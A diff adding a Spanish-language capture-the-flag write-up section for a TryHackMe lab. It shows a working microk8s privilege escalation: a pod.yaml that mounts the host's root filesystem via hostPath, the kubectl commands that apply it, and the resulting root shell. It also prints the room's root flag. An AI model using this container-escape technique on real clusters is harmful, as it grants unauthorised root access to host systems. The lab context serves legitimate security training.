@@ -393,5 +393,229 @@ En el home de frank esta la flag de user.
 frank@dev-01:~$ cat user.txt 
 THM{***********}
 
+Ahora queda escalar privilegios, he visto anteriormente varios servicios levantados en contenedores.
+Voy a investigar un poco eso.
+
+De hecho, al leer el enunciado de la máquina encuentro esto.
+
+Two developers are venturing into the world of kubernetes. Little do these developers know that their lack of understanding in 'k8s', containers, and git has left their resources open to exploitation!
+This box will require some research into how to use microk8s.
+
+Tras recordar un poco como funcionaba, veo como escalar privilegios con mircrok8s y encuentro la siguiente página.
+
+https://pulsesecurity.co.nz/advisories/microk8s-privilege-escalation 
+
+Al ver de cuando es la vulnerabilidad y el tiempo que lleva creado el pod tiene sentido probarlo.
+
+// frank@dev-01:~$ microk8s kubectl get pods
+NAME                                READY   STATUS    RESTARTS   AGE
+nginx-deployment-7b548976fd-77v4r   1/1     Running   2          4y246d
+
+Creo pod.yaml
+
+frank@dev-01:~$ cat pod.yaml 
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hostmount
+spec:
+  containers:
+  - name: shell
+    image: ubuntu:latest // esto lo tendria que cambiar con la imagen del servicio expuesto por frank.
+    command:
+      - "bin/bash"
+      - "-c"
+      - "sleep 10000"
+    volumeMounts:
+      - name: root
+        mountPath: /opt/root
+  volumes:
+  - name: root
+    hostPath:
+      path: /
+      type: Directory
+
+
+Busco la imagen correcta.
+
+frank@dev-01:~$ microk8s kubectl get node -o yaml
+apiVersion: v1
+items:
+- apiVersion: v1
+  kind: Node
+  metadata:
+    annotations:
+      node.alpha.kubernetes.io/ttl: "0"
+      projectcalico.org/IPv4Address: 10.129.162.222/18
+      projectcalico.org/IPv4VXLANTunnelAddr: 10.1.133.192
+      volumes.kubernetes.io/controller-managed-attach-detach: "true"
+    creationTimestamp: "2021-10-03T15:32:24Z"
+    labels:
+      beta.kubernetes.io/arch: amd64
+      beta.kubernetes.io/os: linux
+      kubernetes.io/arch: amd64
+      kubernetes.io/hostname: dev-01
+      kubernetes.io/os: linux
+      microk8s.io/cluster: "true"
+    name: dev-01
+    resourceVersion: "1811874"
+    selfLink: /api/v1/nodes/dev-01
+    uid: 8be18a43-2807-4632-90eb-c2c4909bc28e
+  spec: {}
+  status:
+    addresses:
+    - address: 10.129.162.222
+      type: InternalIP
+    - address: dev-01
+      type: Hostname
+    allocatable:
+      cpu: "1"
+      ephemeral-storage: 14363592Ki
+      hugepages-2Mi: "0"
+      memory: 1929984Ki
+      pods: "110"
+    capacity:
+      cpu: "1"
+      ephemeral-storage: 15412168Ki
+      hugepages-2Mi: "0"
+      memory: 2032384Ki
+      pods: "110"
+    conditions:
+    - lastHeartbeatTime: "2026-06-30T09:13:48Z"
+      lastTransitionTime: "2026-06-30T09:13:48Z"
+      message: Calico is running on this node
+      reason: CalicoIsUp
+      status: "False"
+      type: NetworkUnavailable
+    - lastHeartbeatTime: "2026-06-30T09:23:45Z"
+      lastTransitionTime: "2021-10-03T15:32:24Z"
+      message: kubelet has sufficient memory available
+      reason: KubeletHasSufficientMemory
+      status: "False"
+      type: MemoryPressure
+    - lastHeartbeatTime: "2026-06-30T09:23:45Z"
+      lastTransitionTime: "2021-10-03T15:32:24Z"
+      message: kubelet has no disk pressure
+      reason: KubeletHasNoDiskPressure
+      status: "False"
+      type: DiskPressure
+    - lastHeartbeatTime: "2026-06-30T09:23:45Z"
+      lastTransitionTime: "2021-10-03T15:32:24Z"
+      message: kubelet has sufficient PID available
+      reason: KubeletHasSufficientPID
+      status: "False"
+      type: PIDPressure
+    - lastHeartbeatTime: "2026-06-30T09:23:45Z"
+      lastTransitionTime: "2026-06-30T09:13:43Z"
+      message: kubelet is posting ready status. AppArmor enabled
+      reason: KubeletReady
+      status: "True"
+      type: Ready
+    daemonEndpoints:
+      kubeletEndpoint:
+        Port: 10250
+    images:
+    - names:
+      - docker.io/calico/node@sha256:cb9dea7b86471c71925ae318f7c60af72d9ddf1dab0fe2029832a671b83bba6a
+      - docker.io/calico/node:v3.13.2
+      sizeBytes: 88917441
+    - names:
+      - docker.io/calico/cni@sha256:bbf7e3ac3f80d0a356a6c27b095bd313d1106f8ed84f85850816ed79295843c1
+      - docker.io/calico/cni:v3.13.2
+      sizeBytes: 76710099
+    - names:
+      - localhost:32000/bsnginx@sha256:59dafb4b06387083e51e2589773263ae301fe4285cfa4eb85ec5a3e70323d6bd
+      - localhost:32000/bsnginx:latest
+      sizeBytes: 54817267
+    - names:
+      - docker.io/cdkbot/registry-amd64@sha256:9dc5ad9e0b3ed59afa4febe8d663fd545628c60886a2c9fcd0e186e5cf6343ef
+      - docker.io/cdkbot/registry-amd64:2.6
+      sizeBytes: 54673787
+    - names:
+      - docker.io/calico/pod2daemon-flexvol@sha256:0022da5a9a89512f8a117f12d2088b3f1f8f22c094ee15aae24d58085f2c186a
+      - docker.io/calico/pod2daemon-flexvol:v3.13.2
+      sizeBytes: 37530211
+    - names:
+      - docker.io/calico/kube-controllers@sha256:a635173cbe9deb33deba9baadffd933f61c63fbdadc0e3fa60ff1a14198c1da8
+      - docker.io/calico/kube-controllers:v3.13.2
+      sizeBytes: 23132265
+    - names:
+      - docker.io/coredns/coredns@sha256:cc8fb77bc2a0541949d1d9320a641b82fd392b0d3d8145469ca4709ae769980e
+      - docker.io/coredns/coredns:1.8.0
+      sizeBytes: 12945155
+    - names:
+      - docker.io/cdkbot/hostpath-provisioner-amd64@sha256:339f78eabc68ffb1656d584e41f121cb4d2b667565428c8dde836caf5b8a0228
+      - docker.io/cdkbot/hostpath-provisioner-amd64:1.0.0
+      sizeBytes: 9745308
+    - names:
+      - k8s.gcr.io/pause@sha256:f78411e19d84a252e53bff71a4407a5686c46983a2c2eeed83929b888179acea
+      - k8s.gcr.io/pause:3.1
+      sizeBytes: 317164
+    nodeInfo:
+      architecture: amd64
+      bootID: 03d8022c-e83a-442c-a1ce-d6e49662a4e9
+      containerRuntimeVersion: containerd://1.4.4
+      kernelVersion: 5.4.0-89-generic
+      kubeProxyVersion: v1.21.5-3+83e2bb7ee39726
+      kubeletVersion: v1.21.5-3+83e2bb7ee39726
+      machineID: 57997e1254a8427e86d37ef13ce138b7
+      operatingSystem: linux
+      osImage: Ubuntu 20.04.2 LTS
+      systemUUID: ec2b5896-3f92-bacf-bab1-eff3de79cfd0
+kind: List
+metadata:
+  resourceVersion: ""
+  selfLink: ""
+
+Esta línea me da a entender que este es el servicio expuesto, y la imagen que quiero.
+
+- localhost:32000/bsnginx@sha256:59dafb4b06387083e51e2589773263ae301fe4285cfa4eb85ec5a3e70323d6bd.
+
+Agrego la imagen a mi pod.yaml
+
+frank@dev-01:~$ cat pod.yaml 
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hostmount
+spec:
+  containers:
+  - name: shell
+    image: localhost:32000/bsnginx@sha256:59dafb4b06387083e51e2589773263ae301fe4285cfa4eb85ec5a3e70323d6bd
+    command:
+      - "bin/bash"
+      - "-c"
+      - "sleep 10000"
+    volumeMounts:
+      - name: root
+        mountPath: /opt/root
+  volumes:
+  - name: root
+    hostPath:
+      path: /
+      type: Directory
+
+Recargo la configuración. 
+//En mi caso he borrado y aplicado otra vez, porque se ha quedado congelado recargando.
+frank@dev-01:~$ microk8s kubectl delete pod hostmount
+pod "hostmount" deleted
+frank@dev-01:~$ microk8s kubectl apply -f pod.yaml
+pod/hostmount created
+
+Y finalmente ejecuto el comando.
+
+frank@dev-01:~$ microk8s.kubectl exec -it hostmount /bin/bash
+kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
+root@hostmount:/# 
+
+root@hostmount:/# whoami
+root
+
+Y consigo la flag de root.
+
+root@hostmount:/opt/root/root# cat root.txt 
+THM{M1cr0K8s_13_FUN}
+
+
 
 
